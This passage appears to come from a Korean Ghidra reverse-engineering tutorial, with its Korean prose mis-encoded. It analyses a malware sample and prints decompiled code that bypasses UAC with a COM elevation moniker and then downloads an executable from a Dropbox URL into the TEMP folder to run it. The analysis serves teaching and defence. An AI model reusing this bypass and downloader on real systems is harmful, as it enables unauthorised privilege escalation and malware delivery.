c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004017e4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HMODULE pHVar1;  <span class="hljs-keyword">int</span> iVar2;  undefined *puVar3;  <span class="hljs-keyword">int</span> **ppiVar4;  <span class="hljs-keyword">wchar_t</span> local_27c [<span class="hljs-number">260</span>];  undefined4 local_74 [<span class="hljs-number">5</span>];  undefined4 local_60;  <span class="hljs-keyword">int</span> *local_50;  undefined local_4c [<span class="hljs-number">16</span>];  undefined local_3c [<span class="hljs-number">16</span>];  FARPROC local_2c;  FARPROC local_28;  FARPROC local_24;  <span class="hljs-keyword">int</span> local_20;  FARPROC local_1c;  HMODULE local_18;  <span class="hljs-keyword">int</span> local_14;  <span class="hljs-keyword">int</span> local_10;    local_10 = <span class="hljs-number">0x80004005</span>;  local_14 = <span class="hljs-number">0</span>;  local_50 = (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>;  local_18 = LoadLibraryA(<span class="hljs-string">&quot;ole32.dll&quot;</span>);  local_1c = GetProcAddress(local_18,<span class="hljs-string">&quot;CoInitializeEx&quot;</span>);  ppiVar4 = (<span class="hljs-keyword">int</span> **)<span class="hljs-number">0x6</span>;  puVar3 = (undefined *)<span class="hljs-number">0x0</span>;  local_20 = (*local_1c)(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>);  pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  local_24 = GetProcAddress(pHVar1,<span class="hljs-string">&quot;CLSIDFromString&quot;</span>);  pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  local_28 = GetProcAddress(pHVar1,<span class="hljs-string">&quot;IIDFromString&quot;</span>);  <span class="hljs-keyword">do</span> &#123;    iVar2 = (*local_24)(<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>,local_4c,puVar3,ppiVar4);    <span class="hljs-keyword">if</span> ((iVar2 != <span class="hljs-number">0</span>) ||       (iVar2 = (*local_28)(<span class="hljs-string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span>,local_3c), iVar2 != <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;    FUN_0040f860((undefined *)local_27c,<span class="hljs-number">0x208</span>);    wcscpy(local_27c,<span class="hljs-string">L&quot;Elevation:Administrator!new:&quot;</span>);    wcscat(local_27c,<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>);    FUN_0040f860((undefined *)local_74,<span class="hljs-number">0x24</span>);    local_74[<span class="hljs-number">0</span>] = <span class="hljs-number">0x24</span>;    local_60 = <span class="hljs-number">4</span>;    pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);    local_2c = GetProcAddress(pHVar1,<span class="hljs-string">&quot;CoGetObject&quot;</span>);    ppiVar4 = &amp;local_50;    puVar3 = local_3c;    local_10 = (*local_2c)(local_27c,local_74);    FUN_00401a0f();    local_10 = (**(code **)(*local_50 + <span class="hljs-number">0x24</span>))(local_50,DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);  &#125; <span class="hljs-keyword">while</span> (local_14 != <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_50 != (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>) &#123;    (**(code **)(*local_50 + <span class="hljs-number">8</span>))(local_50);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p><code>GetProcAddress</code>ë¡œ í•¨ìˆ˜ë“¤ì˜ ì£¼ì†Œë¥¼ ê°€ì ¸ì™€ì„œâ€¦ í•¨ìˆ˜ í¬ì¸í„°ë¡œ ì‹¤í–‰ì„ í•˜ëŠ”ë° ë­ê°€ ë¬´ì—‡ì„ í•˜ëŠ”ì§€  ëˆˆì— í™•ì¸í•˜ê¸°ê°€ ì–´ë µìŠµë‹ˆë‹¤. ì´ëŸ´ ë•ŒëŠ” Rename Variable (L)ê³¼ Retype Variable (Ctrl + L)ì„ ì‚¬ìš©í•˜ì—¬ í•œëˆˆì— ë³´ê¸° ì‰½ê²Œ ë§Œë“¤ ìˆ˜ë„ ìˆê³ , íŒŒë¼ë¯¸í„°ë¡œ ë“¤ì–´ê°€ëŠ” ê°’ë“¤ì˜ ë°ì´í„° íƒ€ì…ë„ ìë™ìœ¼ë¡œ ë§ì¶° ì¤ë‹ˆë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%205.png"></p><p><code>local_18</code>ê³¼ <code>local_1c</code>ì˜ ì´ë¦„ì„ ë³€ê²½í–ˆìŠµë‹ˆë‹¤. <code>FARPROC</code>ìœ¼ë¡œ ë˜ì–´ìˆëŠ” <code>CoInitializeEx_addr</code>ì€ <code>CoInitializeEx</code>ì˜ ì£¼ì†Œë¥¼ ë‹´ê³  ìˆìœ¼ë‹ˆ, ë°ì´í„° íƒ€ì…ì„ <code>CoInitializeEx *</code>ë¡œ ë°”ê¾¸ì–´ë³¼ê¹Œìš”?</p><p><code>CoInitializeEx_addr</code>ì— ë§ˆìš°ìŠ¤ ì»¤ì„œë¥¼ ì˜¬ë¦¬ê³  ìš°í´ë¦­ í›„ Retype Variable í˜¹ì€ Ctrl + Lì„ ëˆ„ë¥´ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì°½ì´ ëœ¹ë‹ˆë‹¤. ê±°ê¸°ì— ì í˜€ìˆëŠ” <code>FARPROC</code>ì„ ì§€ìš°ê³  <code>CoInitializeEx *</code>ë¥¼ ì‘ì„±í•œ í›„ OK!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%206.png"></p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%207.png"></p><p>ê·¸ëŸ¼ ìœ„ì™€ ê°™ì´ í•¨ìˆ˜ íƒ€ì…ì„ ì„¤ì •í•˜ëŠ” ì°½ì´ ëœ¹ë‹ˆë‹¤. ìš°ë¦¬ê°€ ì‚¬ìš©í•  í•¨ìˆ˜ê°€ ë§ìœ¼ë‹ˆê¹Œ OK ë²„íŠ¼ì„ ëˆŒëŸ¬ì£¼ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë°”ë€ë‹ˆë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%208.png"></p><p>í•œëˆˆì— ë³´ê¸° í›¨ì”¬ í¸í•´ì¡ŒìŠµë‹ˆë‹¤.</p><p>ë‹¤ë¥¸ ë¶€ë¶„ë„ ìœ„ì™€ ë™ì¼í•˜ê²Œ Rename, Retypeì„ ì§„í–‰í•œ í›„ í•´ë‹¹ í•¨ìˆ˜ì—ì„œ í˜¸ì¶œí•˜ëŠ” ë‹¤ë¥¸ í•¨ìˆ˜ë“¤ì´ ì–´ë– í•œ ë™ì‘ì„ í•˜ëŠ”ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p>ë¨¼ì € <code>FUN_0040f860</code>ë¥¼ ì‚´í´ë´…ì‹œë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_0040f860</span><span class="hljs-params">(undefined *param_1,<span class="hljs-keyword">int</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  undefined *puVar1;    puVar1 = param_1 + param_2;  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">do</span> &#123;      *param_1 = <span class="hljs-number">0</span>;      param_1 = param_1 + <span class="hljs-number">1</span>;    &#125; <span class="hljs-keyword">while</span> (puVar1 != param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>í¬ì¸í„°ë¥¼ ë°›ì•„ì„œ <code>param2</code>ë§Œí¼ 0ìœ¼ë¡œ ì´ˆê¸°í™”í•©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ëŠ” <code>RtlSecureMemory()</code>ì™€ ë§¤ìš° í¡ì‚¬í•˜ì£ .</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __CRT__NO_INLINE 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function">PVOID WINAPI <span class="hljs-title">RtlSecureZeroMemory</span><span class="hljs-params">(PVOID ptr,SIZE_T cnt)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">char</span> *vptr = (<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">char</span> *)ptr;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __x86_64</span>  __stosb ((PBYTE)((DWORD64)vptr),<span class="hljs-number">0</span>,cnt);<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>  <span class="hljs-keyword">while</span> (cnt != <span class="hljs-number">0</span>)    &#123;      *vptr++ = <span class="hljs-number">0</span>;      cnt--;    &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">/* __x86_64 */</span></span>  <span class="hljs-keyword">return</span> ptr;</code></pre><p>ì¶œì²˜ : <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c">https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c</a></p><p>í•´ë‹¹ í•¨ìˆ˜ì˜ ì´ë¦„ì„ <code>RtlSecureMemory</code>ë¡œ í•˜ê³  Function Signatureë¥¼ ìˆ˜ì •í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. í•¨ìˆ˜ ì´ë¦„ì— ì»¤ì„œë¥¼ ì˜¬ë¦° í›„ ìš°í´ë¦­ - Edit Function Signatureë¥¼ í´ë¦­í•˜ì—¬ ìœ„ì˜ ì†ŒìŠ¤ ì½”ë“œì— ë‚˜ì˜¨ Signatureì™€ ë™ì¼í•˜ê²Œ ìˆ˜ì •í•´ì¤ë‹ˆë‹¤. </p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%209.png"></p><p>ê·¸ë¦¬ê³  OKë¥¼ í´ë¦­í•˜ë©´</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">RtlSecureMemory</span><span class="hljs-params">(PVOID param_1,SIZE_T param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  undefined *puVar1;    puVar1 = (undefined *)((<span class="hljs-keyword">int</span>)param_1 + param_2);  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">do</span> &#123;      *(undefined *)param_1 = <span class="hljs-number">0</span>;      param_1 = (PVOID)((<span class="hljs-keyword">int</span>)param_1 + <span class="hljs-number">1</span>);    &#125; <span class="hljs-keyword">while</span> (puVar1 != (undefined *)param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>ê¹”ë”í•˜ê²Œ(?) ë°”ë€ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2010.png"></p><p>í•˜í•˜í•˜ ê´œì°®ìŠµë‹ˆë‹¤. ê·¸ëŸ¼ ì´ì œ ë‹¤ìŒ í•¨ìˆ˜ì¸ <code>FUN_00401a0f</code>ê°€ ì–´ë– í•œ ë™ì‘ì„ í•˜ëŠ”ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2011.png"></p><p>ì•ë¶€ë¶„ì„ ì½ì–´ë³´ë‹ˆ ì¸í„°ë„·ì— ì—°ê²°ì„ í•´ì„œ í•´ë‹¹ URLì—ì„œ ATAPIConfigurationì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” í•¨ìˆ˜ì„ì„ ì§ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë‹¨ í•¨ìˆ˜ëª…ì„ <code>download_ATAPIConfiguration</code>ì´ë¼ê³  í•©ì‹œë‹¤. ì´ í•¨ìˆ˜ì˜ ì „ì²´ì ì¸ ë™ì‘ ê¸°ëŠ¥ì„ ì •ë¦¬í•´ë³´ë©´</p><ol><li><a href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512">COM ì¸í„°í˜ì´ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ UACë¥¼ ìš°íšŒ</a></li><li>ì¸í„°ë„·ì—ì„œ ATAPIConfigurationì„ ë‹¤ìš´ë¡œë“œ</li></ol><p>ê·¸ëŸ¼ í•´ë‹¹ í•¨ìˆ˜ ì´ë¦„ì€ uac_bypass_and_download_fileë¡œ í•˜ì—¬ ì •ë¦¬ë¥¼ í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œê°€ ë©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">uac_bypass_download_file</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HMODULE HModule;  HRESULT HVar1;  <span class="hljs-keyword">wchar_t</span> <span class="hljs-built_in">string</span> [<span class="hljs-number">260</span>];  BIND_OPTS pBindOptions;  undefined4 local_60;  <span class="hljs-keyword">int</span> *ppv;  CLSID local_4c;  IID riid;  CoGetObject *CoGetObject_addr;  IIDFromString *IIDFromString_addr;  CLSIDFromString *CLSIDFromString_addr;  HRESULT local_20;  CoInitializeEx *CoInitializeEx_addr;  HMODULE hModule;  <span class="hljs-keyword">int</span> local_14;  HRESULT local_10;    local_10 = <span class="hljs-number">0x80004005</span>;  local_14 = <span class="hljs-number">0</span>;  ppv = (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>;  hModule = LoadLibraryA(<span class="hljs-string">&quot;ole32.dll&quot;</span>);  CoInitializeEx_addr = (CoInitializeEx *)GetProcAddress(hModule,<span class="hljs-string">&quot;CoInitializeEx&quot;</span>);  local_20 = (*CoInitializeEx_addr)((LPVOID)<span class="hljs-number">0x0</span>,<span class="hljs-number">6</span>);  HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  CLSIDFromString_addr = (CLSIDFromString *)GetProcAddress(HModule,<span class="hljs-string">&quot;CLSIDFromString&quot;</span>);  HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  IIDFromString_addr = (IIDFromString *)GetProcAddress(HModule,<span class="hljs-string">&quot;IIDFromString&quot;</span>);  <span class="hljs-keyword">do</span> &#123;    HVar1 = (*CLSIDFromString_addr)(<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>,(LPCLSID)&amp;local_4c);    <span class="hljs-keyword">if</span> ((HVar1 != <span class="hljs-number">0</span>) ||       (HVar1 = (*IIDFromString_addr)(<span class="hljs-string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span>,(LPIID)&amp;riid),       HVar1 != <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;    RtlSecureZeroMemory(<span class="hljs-built_in">string</span>,<span class="hljs-number">0x208</span>);    wcscpy(<span class="hljs-built_in">string</span>,<span class="hljs-string">L&quot;Elevation:Administrator!new:&quot;</span>);    wcscat(<span class="hljs-built_in">string</span>,<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>);    RtlSecureZeroMemory(&amp;pBindOptions,<span class="hljs-number">0x24</span>);    pBindOptions.cbStruct = <span class="hljs-number">0x24</span>;    local_60 = <span class="hljs-number">4</span>;    HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);    CoGetObject_addr = (CoGetObject *)GetProcAddress(HModule,<span class="hljs-string">&quot;CoGetObject&quot;</span>);    local_10 = (*CoGetObject_addr)(<span class="hljs-built_in">string</span>,&amp;pBindOptions,&amp;riid,&amp;ppv);    download_ATAPIConfiguration();    local_10 = (**(code **)(*ppv + <span class="hljs-number">0x24</span>))(ppv,download_path,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);  &#125; <span class="hljs-keyword">while</span> (local_14 != <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (ppv != (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>) &#123;    (**(code **)(*ppv + <span class="hljs-number">8</span>))(ppv);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><h2 id="ATAPIConfiguration-ë‹¤ìš´ë¡œë“œ-í•¨ìˆ˜"><a href="#ATAPIConfiguration-ë‹¤ìš´ë¡œë“œ-í•¨ìˆ˜" class="headerlink" title="ATAPIConfiguration ë‹¤ìš´ë¡œë“œ í•¨ìˆ˜"></a>ATAPIConfiguration ë‹¤ìš´ë¡œë“œ í•¨ìˆ˜</h2><p>ì´ì œ ì•„ê¹Œ ì§€ë‚˜ì³¤ë˜ <code>download_ATAPIConfiguration()</code>ì„ ë¶„ì„ì„ í•´ë´…ì‹œë‹¤.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">download_ATAPIConfiguration</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE pHVar4;  <span class="hljs-keyword">int</span> iVar5;  <span class="hljs-keyword">size_t</span> sVar6;  undefined4 *puVar7;  uint uVar8;  LPCSTR pCVar9;  <span class="hljs-keyword">int</span> local_64;  undefined4 local_60;  undefined4 local_5c;  uint local_58;  FARPROC local_54;  FARPROC local_50;  FARPROC local_4c;  HANDLE local_48;  FARPROC local_44;  <span class="hljs-keyword">char</span> *local_40;  <span class="hljs-keyword">void</span> *local_3c;  <span class="hljs-keyword">int</span> local_38;  FARPROC local_34;  FARPROC local_30;  FARPROC local_2c;  <span class="hljs-keyword">int</span> local_28;  FARPROC local_24;  <span class="hljs-keyword">int</span> local_20;  FARPROC local_1c;  <span class="hljs-keyword">int</span> local_18;  FARPROC local_14;  HMODULE local_10;    local_10 = LoadLibraryA(<span class="hljs-string">&quot;wininet.dll&quot;</span>);  local_14 = GetProcAddress(local_10,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_18 = (*local_14)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_18 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    local_1c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    local_20 = (*local_1c)(local_18,<span class="hljs-string">L&quot;dl.dropboxusercontent.com&quot;</span>,<span class="hljs-number">0x1bb</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (local_20 == <span class="hljs-number">0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      local_24 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      local_28 = (*local_24)(local_20,&amp;DAT_00413270,<span class="hljs-string">L&quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,                             <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (local_28 == <span class="hljs-number">0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        local_5c = <span class="hljs-number">4</span>;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_2c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        iVar5 = (*local_2c)(local_28,<span class="hljs-number">0x1f</span>,&amp;local_58,&amp;local_5c);        <span class="hljs-keyword">if</span> (iVar5 != <span class="hljs-number">0</span>) &#123;          pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          local_30 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          local_58 = local_58 | <span class="hljs-number">0x1180</span>;          (*local_30)(local_28,<span class="hljs-number">0x1f</span>,&amp;local_58,<span class="hljs-number">4</span>);        &#125;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_34 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_38 = (*local_34)(local_28,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        local_3c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_3c,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        local_40 = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        sVar6 = <span class="hljs-built_in">strlen</span>(local_40);        DAT_0041602c = (LPCSTR)<span class="hljs-built_in">malloc</span>(sVar6 + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_0041602c,local_40);        uVar8 = <span class="hljs-number">0xffffffff</span>;        pCVar9 = DAT_0041602c;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar8 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar8 = uVar8 - <span class="hljs-number">1</span>;          cVar1 = *pCVar9;          pCVar9 = pCVar9 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar7 = (undefined4 *)(DAT_0041602c + (~uVar8 - <span class="hljs-number">1</span>));        *puVar7 = <span class="hljs-number">0x4154415c</span>;        puVar7[<span class="hljs-number">1</span>] = <span class="hljs-number">0x6f434950</span>;        puVar7[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6769666e</span>;        puVar7[<span class="hljs-number">3</span>] = <span class="hljs-number">0x74617275</span>;        puVar7[<span class="hljs-number">4</span>] = <span class="hljs-number">0x2e6e6f69</span>;        puVar7[<span class="hljs-number">5</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_0041602c,<span class="hljs-number">-1</span>,DAT_00416028,<span class="hljs-number">0x1000</span>);        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        local_44 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;CreateFileW&quot;</span>);        local_48 = (HANDLE)(*local_44)(DAT_00416028,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>);        local_60 = <span class="hljs-number">0</span>;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_4c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        local_50 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_38 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_64 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            iVar5 = (*local_4c)(local_28,local_3c,<span class="hljs-number">0x2000</span>,&amp;local_64);            <span class="hljs-keyword">if</span> ((iVar5 == <span class="hljs-number">0</span>) || (local_64 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*local_50)(local_48,local_3c,local_64,&amp;local_60,<span class="hljs-number">0</span>);          &#125;          pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          local_54 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_48);          (*local_54)(local_18);          (*local_54)(local_20);          (*local_54)(local_28);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>ì´ ì¹œêµ¬ë„ ìƒë‹¹íˆ ì§€ì €ë¶„í•˜ë„¤ìš”. ì •ë¦¬ê°€ í•„ìš”í•  ë“¯í•©ë‹ˆë‹¤. ì•„ê¹Œ ì‚¬ìš©í•œ ë°©ë²•ì²˜ëŸ¼ ë¨¼ì € Handleê³¼ í•¨ìˆ˜ í¬ì¸í„°ë“¤ì„ ì •ë¦¬í•´ì¤ì‹œë‹¤!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2012.png"></p><p>í•˜ì§€ë§Œâ€¦ <code>InternetOpenW</code>ì˜ ë°ì´í„° íƒ€ì…ì´ ì—†ë‹¤ê³  ë‚˜ì˜µë‹ˆë‹¤. í â€¦ ë­ê°€ ë¬¸ì œì¼ê¹Œ? Data Type Managerì—ì„œ ì°¾ì•„ë´…ì‹œë‹¤. <code>InternetOpenW()</code>ëŠ” <code>wininet.h</code>ì— ì¡´ì¬í•˜ëŠ” í•¨ìˆ˜ì´ë‹ˆ <code>wininet.h</code>ê°€ ìˆëŠ”ì§€ í™•ì¸ì„ í•´ë³¼ê¹Œìš”?</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2013.png"></p><p>ì—†ë„¤ìš”â€¦ ê·¸ëŸ¼ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì§€ ëª»í•˜ëŠ” ê±¸ê¹Œìš”? MSDNì„ ë³´ê³  ì†ìˆ˜ ì‘ì„±ì„ í•´ì•¼ í•˜ëŠ” ê±´ê°€? ì§ì ‘ í—¤ë” íŒŒì¼ì„ ì¶”ê°€í•´ì•¼ í•˜ëŠ” ê±´ê°€? ì§ì ‘ í—¤ë” íŒŒì¼ì„ ì¶”ê°€í•˜ëŠ” ë°©ë²•ë„ ìˆì§€ë§Œ, ì´ëŸ° WinAPIë“¤ì˜ ì•„ì¹´ì´ë¸Œ íŒŒì¼ì„ ëˆ„êµ°ê°€ githubì— ì˜¬ë ¤ë†“ì•˜ìŠµë‹ˆë‹¤!</p><p>ì €ëŠ” Visual Studio Communityë¥¼ ë‹¤ìš´ë¡œë“œí•´ì„œ í•´ë‹¹ í—¤ë” íŒŒì¼ì„ ì§ì ‘ ì¶”ê°€í•˜ê³ ì í•˜ì˜€ìœ¼ë‚˜ ì–´ë–¤ ì´ìœ ì—ì„œì¸ì§€â€¦ ê°ì¢… referenceë¥¼ ì°¾ì•„ì„œ ë˜‘ê°™ì´ í•´ë„ ì¶”ê°€ê°€ ì•ˆë˜ë”ë¼ê³ ìš”â€¦ ë˜‘ê°™ì€ í–‰ìœ„ë¥¼ ë°˜ë³µí•˜ë©° ì—”í„°ë¥¼ ê³„ì† ëˆ„ë¥´ë©° ë¶„ë…¸ ê²Œì´ì§€ê°€ ì°¨ê³  ìˆì—ˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2014.png"></p><p>ê·¸ëŸ¬ë˜ ì™€ì¤‘ ì•„ë˜ì˜ github repoëŠ” ì €ì—ê²Œ í° ë„ì›€ì´ ë˜ì—ˆì£ !</p><p><a href="https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo">https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo</a></p><p>í•´ë‹¹ í”„ë¡œê·¸ë¨ì€ 32ë¹„íŠ¸ ë°”ì´ë„ˆë¦¬ì´ë¯€ë¡œ <code>winapi_32.gdt</code> íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•©ë‹ˆë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2015.png"></p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2016.png"></p><p>ê·¸ í›„ Data Type Managerì˜ ìš°ì¸¡ ìƒë‹¨ì— ì•„ë˜ìª½ í™”ì‚´í‘œ ëª¨ì–‘ì„ í´ë¦­í•œ í›„ Open File Archiveë¥¼ í´ë¦­í•©ë‹ˆë‹¤.</p><p><img 